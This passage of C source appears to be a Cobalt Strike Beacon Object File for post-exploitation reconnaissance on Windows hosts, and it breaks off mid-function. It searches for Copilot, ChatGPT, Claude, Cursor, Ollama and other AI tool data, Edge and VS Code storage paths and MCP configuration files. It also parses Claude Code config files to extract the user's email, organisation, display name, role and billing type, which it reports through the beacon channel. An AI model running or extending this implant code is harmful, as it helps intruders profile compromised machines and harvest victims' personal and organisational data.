#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <stddef.h>
#include <stdint.h>

#ifndef DECLSPEC_IMPORT
#ifdef _WIN32
#define DECLSPEC_IMPORT __declspec(dllimport)
#else
#define DECLSPEC_IMPORT
#endif
#endif

#ifndef WINAPI
#ifdef _WIN32
#define WINAPI __stdcall
#else
#define WINAPI
#endif
#endif

#ifndef HANDLE
typedef void *HANDLE;
#endif
#ifndef DWORD
typedef unsigned long DWORD;
#endif
#ifndef BOOL
typedef int BOOL;
#endif
#ifndef LONG
typedef long LONG;
#endif
#ifndef LPCWSTR
typedef const unsigned short *LPCWSTR;
#endif
#ifndef LPWSTR
typedef unsigned short *LPWSTR;
#endif
#ifndef LPDWORD
typedef DWORD *LPDWORD;
#endif
#ifndef LPBYTE
typedef unsigned char *LPBYTE;
#endif
#ifndef LPVOID
typedef void *LPVOID;
#endif
#ifndef PHKEY
typedef void **PHKEY;
#endif
#ifndef REGSAM
typedef DWORD REGSAM;
#endif
#ifndef HKEY
typedef void *HKEY;
#endif
#ifndef ULONG_PTR
typedef uintptr_t ULONG_PTR;
#endif

#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif

#ifndef STARTUPINFO
typedef struct _STARTUPINFO {
    void *reserved;
} STARTUPINFO;
#endif

#ifndef PROCESS_INFORMATION
typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
} PROCESS_INFORMATION;
#endif

#include "beacon.h"

#define MAX_PATH_LEN 520
#define MAX_PROJECT_HITS 16

#define SECTION_WINDOWS_COPILOT "[i] Windows Copilot"
#define SECTION_OFFICE_COPILOT  "[i] Office Copilot"
#define SECTION_EDGE_COPILOT    "[i] Edge Copilot"
#define SECTION_GH_COPILOT      "[i] GitHub Copilot"
#define SECTION_THIRD_PARTY_AI  "[i] Third-party AI"
#define SECTION_MCP_CONFIGS     "[i] MCP Configuration Discovery"

#ifndef INVALID_HANDLE_VALUE
#define INVALID_HANDLE_VALUE ((HANDLE)-1)
#endif
#ifndef INVALID_FILE_ATTRIBUTES
#define INVALID_FILE_ATTRIBUTES ((DWORD)0xFFFFFFFF)
#endif
#ifndef FILE_ATTRIBUTE_DIRECTORY
#define FILE_ATTRIBUTE_DIRECTORY 0x00000010
#endif
#ifndef HKEY_CURRENT_USER
#define HKEY_CURRENT_USER ((HKEY)(ULONG_PTR)((LONG)0x80000001))
#endif
#ifndef KEY_READ
#define KEY_READ 0x20019
#endif
#ifndef ERROR_SUCCESS
#define ERROR_SUCCESS 0L
#endif
#ifndef REG_DWORD
#define REG_DWORD 4
#endif
#ifndef OPEN_EXISTING
#define OPEN_EXISTING 3
#endif
#ifndef GENERIC_READ
#define GENERIC_READ 0x80000000
#endif
#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ 0x00000001
#endif
#ifndef FILE_SHARE_WRITE
#define FILE_SHARE_WRITE 0x00000002
#endif
#ifndef FILE_SHARE_DELETE
#define FILE_SHARE_DELETE 0x00000004
#endif
#ifndef MEM_COMMIT
#define MEM_COMMIT 0x00001000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE 0x00002000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE 0x00008000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE 0x04
#endif

typedef struct {
    DWORD dwFileAttributes;
    unsigned long nFileSizeHigh;
    unsigned long nFileSizeLow;
    wchar_t cFileName[260];
} WIN32_FIND_DATAW;
typedef WIN32_FIND_DATAW *LPWIN32_FIND_DATAW;

typedef struct {
    int mcp_files_found;
    int project_hits;
} scan_results_t;

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableW(LPCWSTR, LPWSTR, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR, LPWSTR, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPVOID);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, size_t, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID, size_t, DWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

static void inline_memset(void *dest, int value, size_t count) {
    unsigned char *d = (unsigned char *)dest;
    while (count--) {
        *d++ = (unsigned char)value;
    }
}

static size_t inline_wcslen(const wchar_t *s) {
    size_t i = 0;
    if (!s) {
        return 0;
    }
    while (s[i] != L'\0') {
        i++;
    }
    return i;
}

static size_t inline_strlen(const char *s) {
    size_t i = 0;
    if (!s) {
        return 0;
    }
    while (s[i] != '\0') {
        i++;
    }
    return i;
}

static int build_path(const wchar_t *left, const wchar_t *right, wchar_t *out, size_t out_size) {
    size_t idx = 0;
    size_t i = 0;
    if (!left || !right || !out || out_size == 0) {
        return 0;
    }
    while (left[i] && idx + 1 < out_size) {
        out[idx++] = left[i++];
    }
    i = 0;
    while (right[i] && idx + 1 < out_size) {
        out[idx++] = right[i++];
    }
    out[idx] = L'\0';
    return 1;
}

static int append_wide_in_place(wchar_t *dst, const wchar_t *suffix, size_t out_size) {
    size_t idx;
    size_t j = 0;
    if (!dst || !suffix || out_size == 0) {
        return 0;
    }
    idx = inline_wcslen(dst);
    while (suffix[j] && idx + 1 < out_size) {
        dst[idx++] = suffix[j++];
    }
    if (suffix[j] != L'\0') {
        if (idx < out_size) {
            dst[idx] = L'\0';
        }
        return 0;
    }
    dst[idx] = L'\0';
    return 1;
}

static int ascii_tolower(int c) {
    if (c >= 'A' && c <= 'Z') {
        return c + 32;
    }
    return c;
}

static int ascii_contains_ci(const char *hay, const char *needle) {
    size_t nlen = 0;
    size_t i;
    if (!hay || !needle) {
        return 0;
    }
    while (needle[nlen]) {
        nlen++;
    }
    if (nlen == 0) {
        return 0;
    }
    for (i = 0; hay[i]; i++) {
        size_t j = 0;
        while (hay[i + j] && needle[j] &&
               ascii_tolower((int)hay[i + j]) == ascii_tolower((int)needle[j])) {
            j++;
        }
        if (j == nlen) {
            return 1;
        }
    }
    return 0;
}

static int wide_equals(const wchar_t *left, const wchar_t *right) {
    size_t i = 0;
    if (!left || !right) {
        return 0;
    }
    while (left[i] && right[i]) {
        if (left[i] != right[i]) {
            return 0;
        }
        i++;
    }
    return left[i] == right[i];
}

static const char *ascii_find(const char *hay, const char *needle) {
    size_t i;
    size_t nlen = inline_strlen(needle);
    if (!hay || !needle || nlen == 0) {
        return NULL;
    }
    for (i = 0; hay[i]; i++) {
        size_t j = 0;
        while (hay[i + j] && needle[j] && hay[i + j] == needle[j]) {
            j++;
        }
        if (j == nlen) {
            return hay + i;
        }
    }
    return NULL;
}

static void wchar_to_ascii(const wchar_t *src, char *dst, size_t max) {
    size_t i = 0;
    if (!src || !dst || max == 0) {
        return;
    }
    while (src[i] && i + 1 < max) {
        wchar_t c = src[i];
        if (c <= 127) {
            dst[i] = (char)c;
        } else {
            dst[i] = '?';
        }
        i++;
    }
    dst[i] = '\0';
}

static int path_exists(const wchar_t *path) {
    DWORD attr;
    if (!path) {
        return 0;
    }
    attr = KERNEL32$GetFileAttributesW(path);
    return (attr != INVALID_FILE_ATTRIBUTES);
}

static int is_directory(const wchar_t *path) {
    DWORD attr;
    if (!path) {
        return 0;
    }
    attr = KERNEL32$GetFileAttributesW(path);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        return 0;
    }
    return ((attr & FILE_ATTRIBUTE_DIRECTORY) != 0);
}

static void report_path_if_exists(const wchar_t *label, const wchar_t *path) {
    if (!label || !path) {
        return;
    }
    if (path_exists(path)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, path);
    }
}

static int name_matches_copilot(const wchar_t *name) {
    char ascii[256];
    int result;
    if (!name) {
        return 0;
    }
    inline_memset(ascii, 0, sizeof(ascii));
    wchar_to_ascii(name, ascii, sizeof(ascii));
    result = ascii_contains_ci(ascii, "copilot") || ascii_contains_ci(ascii, "microsoft.windows.copilot");
    inline_memset(ascii, 0, sizeof(ascii));
    return result;
}

static int read_file_text_bounded(LPCWSTR path, DWORD max_bytes, char **out_buf, DWORD *file_size_out) {
    HANDLE hFile;
    DWORD fileSize;
    DWORD toRead;
    DWORD bytesRead = 0;
    char *buffer;

    if (!path || !out_buf || !file_size_out || max_bytes == 0) {
        return 0;
    }

    *out_buf = NULL;
    *file_size_out = 0;
    hFile = KERNEL32$CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_ATTRIBUTES) {
        KERNEL32$CloseHandle(hFile);
        return 0;
    }

    toRead = fileSize;
    if (toRead > max_bytes) {
        toRead = max_bytes;
    }

    buffer = (char *)KERNEL32$VirtualAlloc(NULL, (size_t)toRead + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        KERNEL32$CloseHandle(hFile);
        return 0;
    }

    inline_memset(buffer, 0, (size_t)toRead + 1);
    if (!KERNEL32$ReadFile(hFile, buffer, toRead, &bytesRead, NULL)) {
        KERNEL32$CloseHandle(hFile);
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        return 0;
    }
    KERNEL32$CloseHandle(hFile);

    buffer[bytesRead] = '\0';
    *out_buf = buffer;
    *file_size_out = fileSize;
    return 1;
}

static int extract_json_string_value(const char *json, const char *key, char *out, size_t out_size) {
    const char *match;
    size_t i = 0;
    if (!json || !key || !out || out_size == 0) {
        return 0;
    }
    match = ascii_find(json, key);
    if (!match) {
        out[0] = '\0';
        return 0;
    }
    match += inline_strlen(key);
    while (*match && *match != '"') {
        match++;
    }
    if (*match != '"') {
        out[0] = '\0';
        return 0;
    }
    match++;
    while (*match && *match != '"' && i + 1 < out_size) {
        out[i++] = *match++;
    }
    out[i] = '\0';
    return i > 0;
}

static int extract_json_literal_value(const char *json, const char *key, char *out, size_t out_size) {
    const char *match;
    size_t i = 0;
    if (!json || !key || !out || out_size == 0) {
        return 0;
    }
    match = ascii_find(json, key);
    if (!match) {
        out[0] = '\0';
        return 0;
    }
    match += inline_strlen(key);
    while (*match == ' ') {
        match++;
    }
    while (*match && *match != ',' && *match != '}' && i + 1 < out_size) {
        out[i++] = *match++;
    }
    out[i] = '\0';
    return i > 0;
}

static void print_claude_code_account_summary(const wchar_t *path) {
    char *buffer = NULL;
    DWORD fileSize = 0;
    char email[128];
    char orgName[160];
    char displayName[96];
    char billingType[64];
    char orgRole[64];

    inline_memset(email, 0, sizeof(email));
    inline_memset(orgName, 0, sizeof(orgName));
    inline_memset(displayName, 0, sizeof(displayName));
    inline_memset(billingType, 0, sizeof(billingType));
    inline_memset(orgRole, 0, sizeof(orgRole));

    if (!read_file_text_bounded(path, 65535, &buffer, &fileSize)) {
        return;
    }

    if (extract_json_string_value(buffer, "\"emailAddress\":", email, sizeof(email))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Email: %s\n", email);
    }
    if (extract_json_string_value(buffer, "\"organizationName\":", orgName, sizeof(orgName))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Organization: %s\n", orgName);
    }
    if (extract_json_string_value(buffer, "\"displayName\":", displayName, sizeof(displayName))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Display Name: %s\n", displayName);
    }
    if (extract_json_string_value(buffer, "\"organizationRole\":", orgRole, sizeof(orgRole))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Org Role: %s\n", orgRole);
    }
    if (extract_json_string_value(buffer, "\"billingType\":", billingType, sizeof(billingType))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Billing: %s\n", billingType);
    } else if (extract_json_literal_value(buffer, "\"billingType\":", billingType, sizeof(billingType))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Billing: %s\n", billingType);
    }

    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
}

static int preview_config_file(const wchar_t *label, const wchar_t *path, scan_results_t *results) {
    if (!label || !path || !results) {
        return 0;
    }
    if (!path_exists(path)) {
        return 0;
    }

    results->mcp_files_found++;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, path);
    if (wide_equals(label, L"Claude Code MCP Config")) {
        print_claude_code_account_summary(path);
    }
    return 1;
}

static int preview_expanded_config(const wchar_t *label, const wchar_t *pattern, scan_results_t *results) {
    wchar_t path[MAX_PATH_LEN];
    DWORD needed;

    inline_memset(path, 0, sizeof(path));
    needed = KERNEL32$ExpandEnvironmentStringsW(pattern, path, MAX_PATH_LEN);
    if (needed == 0 || needed > MAX_PATH_LEN) {
        return 0;
    }
    return preview_config_file(label, path, results);
}

static void check_taskbar_ai_setting(void) {
    HKEY hKey = NULL;
    LONG res;
    DWORD value = 0;
    DWORD type = 0;
    DWORD size = sizeof(DWORD);

    res = ADVAPI32$RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
        0,
        KEY_READ,
        &hKey
    );
    if (res != ERROR_SUCCESS) {
        return;
    }

    res = ADVAPI32$RegQueryValueExW(hKey, L"TaskbarAI", NULL, &type, (LPBYTE)&value, &size);
    if (res == ERROR_SUCCESS && type == REG_DWORD && value != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Copilot visible in taskbar\n");
    }
    ADVAPI32$RegCloseKey(hKey);
}

static void check_windows_copilot(void) {
    wchar_t localApp[MAX_PATH_LEN];
    wchar_t packagesRoot[MAX_PATH_LEN];
    wchar_t search[MAX_PATH_LEN];
    wchar_t localState[MAX_PATH_LEN];
    wchar_t sub[MAX_PATH_LEN];
    WIN32_FIND_DATAW fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    int found = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_WINDOWS_COPILOT ":\n");

    inline_memset(localApp, 0, sizeof(localApp));
    inline_memset(packagesRoot, 0, sizeof(packagesRoot));
    inline_memset(search, 0, sizeof(search));
    inline_memset(localState, 0, sizeof(localState));
    inline_memset(sub, 0, sizeof(sub));
    inline_memset(&fd, 0, sizeof(fd));

    if (KERNEL32$GetEnvironmentVariableW(L"LOCALAPPDATA", localApp, MAX_PATH_LEN) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
        goto cleanup;
    }

    if (!build_path(localApp, L"\\Packages\\", packagesRoot, MAX_PATH_LEN) ||
        !build_path(packagesRoot, L"Microsoft*", search, MAX_PATH_LEN)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
        goto cleanup;
    }

    hFind = KERNEL32$FindFirstFileW(search, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
                continue;
            }
            if (fd.cFileName[0] == L'.') {
                continue;
            }
            if (!name_matches_copilot(fd.cFileName)) {
                continue;
            }

            found = 1;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Package: %S\n", fd.cFileName);

            inline_memset(localState, 0, sizeof(localState));
            if (!build_path(packagesRoot, fd.cFileName, localState, MAX_PATH_LEN)) {
                continue;
            }
            if (!append_wide_in_place(localState, L"\\LocalState", MAX_PATH_LEN)) {
                continue;
            }

            if (path_exists(localState)) {
                report_path_if_exists(L"LocalState", localState);

                inline_memset(sub, 0, sizeof(sub));
                if (build_path(localState, L"\\Copilot", sub, MAX_PATH_LEN)) {
                    report_path_if_exists(L"Copilot", sub);
                }

                inline_memset(sub, 0, sizeof(sub));
                if (build_path(localState, L"\\Service", sub, MAX_PATH_LEN)) {
                    report_path_if_exists(L"Service", sub);
                }

                inline_memset(sub, 0, sizeof(sub));
                if (build_path(localState, L"\\EBWebView", sub, MAX_PATH_LEN)) {
                    report_path_if_exists(L"EBWebView", sub);
                }
            }
        } while (KERNEL32$FindNextFileW(hFind, &fd));
    }

    if (!found) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
    } else {
        check_taskbar_ai_setting();
    }

cleanup:
    if (hFind != INVALID_HANDLE_VALUE) {
        KERNEL32$FindClose(hFind);
    }
}

static void check_office_copilot(void) {
    HKEY hKey = NULL;
    LONG res;
    wchar_t appData[MAX_PATH_LEN];
    wchar_t localAppData[MAX_PATH_LEN];
    wchar_t path[MAX_PATH_LEN];
    int office_installed = 0;
    int any = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_OFFICE_COPILOT ":\n");

    res = ADVAPI32$RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Office\\16.0\\Common\\Identity",
        0,
        KEY_READ,
        &hKey
    );
    if (res == ERROR_SUCCESS) {
        office_installed = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Office installed\n");
        ADVAPI32$RegCloseKey(hKey);
    }

    inline_memset(appData, 0, sizeof(appData));
    inline_memset(localAppData, 0, sizeof(localAppData));
    inline_memset(path, 0, sizeof(path));

    KERNEL32$GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH_LEN);
    KERNEL32$GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH_LEN);

    if (localAppData[0]) {
        if (build_path(localAppData, L"\\Microsoft\\Office\\16.0\\OfficeFileCache", path, MAX_PATH_LEN) &&
            path_exists(path)) {
            any = 1;
            report_path_if_exists(L"OfficeFileCache", path);
        }

        inline_memset(path, 0, sizeof(path));
        if (build_path(localAppData, L"\\Microsoft\\Office\\Copilot", path, MAX_PATH_LEN) &&
            path_exists(path)) {
            any = 1;
            report_path_if_exists(L"Copilot", path);
        }
    }

    if (appData[0]) {
        inline_memset(path, 0, sizeof(path));
        if (build_path(appData, L"\\Microsoft\\Office\\OfficeFileCache", path, MAX_PATH_LEN) &&
            path_exists(path)) {
            any = 1;
            report_path_if_exists(L"OfficeFileCache", path);
        }

        inline_memset(path, 0, sizeof(path));
        if (build_path(appData, L"\\Microsoft\\Office\\Copilot", path, MAX_PATH_LEN) &&
            path_exists(path)) {
            any = 1;
            report_path_if_exists(L"Copilot", path);
        }
    }

    if (!office_installed && !any) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
    }
}

static void check_edge_copilot(void) {
    wchar_t localApp[MAX_PATH_LEN];
    wchar_t path[MAX_PATH_LEN];
    wchar_t profileSearch[MAX_PATH_LEN];
    wchar_t profileLeveldb[MAX_PATH_LEN];
    char ascii[256];
    WIN32_FIND_DATAW fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    int any = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_EDGE_COPILOT ":\n");

    inline_memset(localApp, 0, sizeof(localApp));
    inline_memset(path, 0, sizeof(path));
    inline_memset(profileSearch, 0, sizeof(profileSearch));
    inline_memset(profileLeveldb, 0, sizeof(profileLeveldb));
    inline_memset(ascii, 0, sizeof(ascii));
    inline_memset(&fd, 0, sizeof(fd));

    if (KERNEL32$GetEnvironmentVariableW(L"LOCALAPPDATA", localApp, MAX_PATH_LEN) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
        goto cleanup;
    }

    if (build_path(localApp, L"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Default profile: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(localApp, L"\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Profile 1: %S\n", path);
    }

    if (build_path(localApp, L"\\Microsoft\\Edge\\User Data\\Profile *", profileSearch, MAX_PATH_LEN)) {
        hFind = KERNEL32$FindFirstFileW(profileSearch, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0 || fd.cFileName[0] == L'.') {
                    continue;
                }

                inline_memset(ascii, 0, sizeof(ascii));
                wchar_to_ascii(fd.cFileName, ascii, sizeof(ascii));
                if (ascii_contains_ci(ascii, "Profile 1") || ascii_contains_ci(ascii, "Default")) {
                    continue;
                }

                inline_memset(profileLeveldb, 0, sizeof(profileLeveldb));
                if (!build_path(localApp, L"\\Microsoft\\Edge\\User Data\\", profileLeveldb, MAX_PATH_LEN)) {
                    continue;
                }
                if (!append_wide_in_place(profileLeveldb, fd.cFileName, MAX_PATH_LEN) ||
                    !append_wide_in_place(profileLeveldb, L"\\Local Storage\\leveldb", MAX_PATH_LEN)) {
                    continue;
                }

                if (path_exists(profileLeveldb)) {
                    any = 1;
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", fd.cFileName, profileLeveldb);
                }
            } while (KERNEL32$FindNextFileW(hFind, &fd));
        }
    }

    if (!any) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
    }

cleanup:
    if (hFind != INVALID_HANDLE_VALUE) {
        KERNEL32$FindClose(hFind);
    }
}

static void scan_vscode_workspace_storage(const wchar_t *base_path, const wchar_t *variant_name) {
    wchar_t wsPath[MAX_PATH_LEN];

    if (!base_path || !variant_name) {
        return;
    }

    inline_memset(wsPath, 0, sizeof(wsPath));
    if (!build_path(base_path, L"\\workspaceStorage", wsPath, MAX_PATH_LEN)) {
        return;
    }
    if (path_exists(wsPath)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S workspaceStorage: %S\n", variant_name, wsPath);
    }
}

static void check_github_copilot(void) {
    wchar_t appData[MAX_PATH_LEN];
    wchar_t path[MAX_PATH_LEN];
    wchar_t codePath[MAX_PATH_LEN];
    int any = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_GH_COPILOT ":\n");

    inline_memset(appData, 0, sizeof(appData));
    inline_memset(path, 0, sizeof(path));
    inline_memset(codePath, 0, sizeof(codePath));

    if (KERNEL32$GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH_LEN) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
        return;
    }

    if (build_path(appData, L"\\Code\\User\\globalStorage\\github.copilot", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] VS Code Copilot: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\Code\\User\\globalStorage\\github.copilot-chat", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] VS Code Copilot Chat: %S\n", path);
    }

    if (build_path(appData, L"\\Code\\User", codePath, MAX_PATH_LEN)) {
        scan_vscode_workspace_storage(codePath, L"VS Code");
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\Code - Insiders\\User\\globalStorage\\github.copilot", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] VS Code Insiders Copilot: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\Code - Insiders\\User\\globalStorage\\github.copilot-chat", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] VS Code Insiders Copilot Chat: %S\n", path);
    }

    inline_memset(codePath, 0, sizeof(codePath));
    if (build_path(appData, L"\\Code - Insiders\\User", codePath, MAX_PATH_LEN)) {
        scan_vscode_workspace_storage(codePath, L"VS Code Insiders");
    }

    if (!any) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
    }
}

static void check_third_party_ai(void) {
    wchar_t appData[MAX_PATH_LEN];
    wchar_t path[MAX_PATH_LEN];
    int any = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_THIRD_PARTY_AI ":\n");

    inline_memset(appData, 0, sizeof(appData));
    inline_memset(path, 0, sizeof(path));

    if (KERNEL32$GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH_LEN) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
        return;
    }

    if (build_path(appData, L"\\ChatGPT\\Local Storage\\leveldb", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ChatGPT: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\Claude\\Local Storage\\leveldb", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Claude: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\Cursor\\Local Storage\\leveldb", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Cursor: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\LM Studio", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LM Studio: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\Ollama", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Ollama: %S\n", path);
    }

    inline_memset(path, 0, sizeof(path));
    if (build_path(appData, L"\\Codeium\\Windsurf", path, MAX_PATH_LEN) &&
        path_exists(path)) {
        any = 1;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Windsurf: %S\n", path);
    }

    if (!any) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Not detected\n");
    }
}

static void scan_vscode_mcp_extensions(const wchar_t *storage_root, const wchar_t *variant_name, scan_results_t *results) {
    wchar_t search[MAX_PATH_LEN];
    WIN32_FIND_DATAW fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    int any = 0;

    if (!storage_root || !variant_name || !results) {
        return;
    }
    if (!is_directory(storage_root)) {
        return;
    }

    inline_memset(search, 0, sizeof(search));
    inline_memset(&fd, 0, sizeof(fd));
    if (!build_path(storage_root, L"\\*", search, MAX_PATH_LEN)) {
        return;
    }

    hFind = KERNEL32$FindFirstFileW(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        char ascii[260];

        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0 || fd.cFileName[0] == L'.') {
            continue;
        }

        inline_memset(ascii, 0, sizeof(ascii));
        wchar_to_ascii(fd.cFileName, ascii, sizeof(ascii));
        if (!ascii_contains_ci(ascii, "mcp") &&
            !ascii_contains_ci(ascii, "modelcontextprotocol") &&
            !ascii_contains_ci(ascii, "claude-dev") &&
            !ascii_contains_ci(ascii, "roo-cline") &&
            !ascii_contains_ci(ascii, "continue")) {
            continue;
        }

        if (!any) {
            BeaconPrintf(CALLBACK_OUTPUT, "[i] %S potential MCP extension storage:\n", variant_name);
            any = 1;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S\\%S\n", storage_root, fd.cFileName);
        results->mcp_files_found++;
    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}

static void inspect_project_candidate(const wchar_t *project_path, scan_results_t *results) {
    wchar_t candidate[MAX_PATH_LEN];

    if (!project_path || !results) {
        return;
    }
    if (results->project_hits >= MAX_PROJECT_HITS) {
        return;
    }

    inline_memset(candidate, 0, sizeof(candidate));
    if (build_path(project_path, L"\\.mcp.json", candidate, MAX_PATH_LEN) &&
        preview_config_file(L"Project .mcp.json", candidate, results)) {
        results->project_hits++;
    }

    if (results->project_hits >= MAX_PROJECT_HITS) {
        return;
    }

    inline_memset(candidate, 0, sizeof(candidate));
    if (build_path(project_path, L"\\.cursor\\rules\\mcp.json", candidate, MAX_PATH_LEN) &&
        preview_config_file(L"Project Cursor MCP", candidate, results)) {
        results->project_hits++;
    }
}

static void scan_project_root_pattern(const wchar_t *root_pattern, scan_results_t *results) {
    wchar_t root[MAX_PATH_LEN];
